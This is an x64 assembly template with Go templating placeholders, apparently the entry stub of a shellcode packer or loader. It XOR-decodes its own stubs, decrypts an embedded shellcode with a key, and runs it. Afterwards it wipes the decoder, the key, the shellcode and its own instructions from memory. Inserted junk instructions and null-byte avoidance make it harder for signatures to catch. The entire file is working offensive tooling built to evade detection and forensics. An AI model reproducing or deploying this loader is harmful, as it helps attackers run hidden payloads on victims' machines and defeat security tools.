.code64

entry:
  // save context and prepare the environment
  {{db .SaveContext}}
  push rbx

  // calculate the entry address
  lea rbx, [rip + entry]

  // save arguments for call shellcode
  push rcx
  push rdx
  push r8
  push r9

  // decode instructions in stub and erase them
  call decode_stubs
  call decode_shellcode
  call erase_decoder_stub
  call erase_crypto_key_stub

  // erase useless functions and entry
 flag_eraser_1:
  lea rcx, [rbx + mini_xor]          {{iji}}
  mov rdx, eraser_stub - mini_xor    {{iji}}
  call eraser_stub                   {{iji}}

  mov rcx, rbx                       {{iji}}
  mov rdx, flag_eraser_1             {{iji}}
  call eraser_stub                   {{iji}}

  // restore arguments for call shellcode
  pop r9                             {{iji}}
  pop r8                             {{iji}}
  pop rdx                            {{iji}}
  pop rcx                            {{iji}}

  // ensure stack is 16 bytes aligned
  push rbp                           {{iji}}
  mov rbp, rsp                       {{iji}}
  mov rax, rbp                       {{iji}}
  and rax, 0x0F                      {{iji}}
  sub rsp, rax                       {{iji}}

  // execute the shellcode
  sub rsp, 0x80                      {{iji}}
  call shellcode_stub                {{iji}}
  add rsp, 0x80                      {{iji}}

  // restore stack and rbp
  mov rsp, rbp                       {{iji}}
  pop rbp                            {{iji}}

  // save the shellcode return value
  push rax                           {{iji}}

  // erase the shellcode stub
{{if .EraseShellcode}}
  lea rcx, [rbx + shellcode_stub]    {{iji}}
  mov rdx, {{hex .ShellcodeLen}}     {{iji}}
  call eraser_stub                   {{iji}}
{{end}}

  // erase the above instructions
 flag_eraser_2:
  mov rcx, rbx                       {{iji}}
  // prevent appear three 0x00
  xor edx, edx                       {{iji}}
  add dx, flag_eraser_2 + 8          {{iji}}
  call eraser_stub                   {{iji}}

  // erase the eraser stub
  lea rdi, [rbx + eraser_stub]       {{iji}}
  lea rsi, [rbx + crypto_key_stub]   {{iji}}
  // prevent appear three 0x00
  xor ecx, ecx                       {{iji}}
  add cx, {{hex .EraserLen}}         {{iji}}
  cld                                {{iji}}
  rep movsb                          {{iji}}

  // restore the shellcode return value
  pop rax                            {{iji}}

  // restore context
  pop rbx                            {{iji}}
  {{db .RestoreContext}}
  ret                                {{iji}}

// rcx = data address, rdx = data length, r8 = key.
// this function assumes that the data length is divisible by 8.
mini_xor:
  shr rdx, 3     // rdx /= 8
  loop_xor:
  xor [rcx], r8
  add rcx, 8
  dec rdx
  jnz loop_xor
  ret

decode_stubs:
  mov r8, {{hex .StubKey}}

  lea rcx, [rbx + decoder_stub]
  mov rdx, eraser_stub - decoder_stub
  call mini_xor

  lea rcx, [rbx + eraser_stub]
  mov rdx, crypto_key_stub - eraser_stub
  call mini_xor

  lea rcx, [rbx + crypto_key_stub]
  mov rdx, shellcode_stub - crypto_key_stub
  call mini_xor
  ret

decode_shellcode:
  lea rcx, [rbx + shellcode_stub]
  mov rdx, {{hex .ShellcodeLen}}
  lea r8, [rbx + crypto_key_stub]
  mov r9, {{hex .CryptoKeyLen}}
  sub rsp, 0x40
  call decoder_stub
  add rsp, 0x40
  ret

erase_decoder_stub:
  lea rcx, [rbx + decoder_stub]
  mov rdx, eraser_stub - decoder_stub
  call eraser_stub
  ret

erase_crypto_key_stub:
  lea rcx, [rbx + crypto_key_stub]
  mov rdx, shellcode_stub - crypto_key_stub
  call eraser_stub
  ret

decoder_stub:
  {{db .DecoderStub}}                {{iji}}

eraser_stub:
  {{db .EraserStub}}                 {{iji}}

crypto_key_stub:
  {{db .CryptoKeyStub}}              {{iji}}

shellcode_stub:
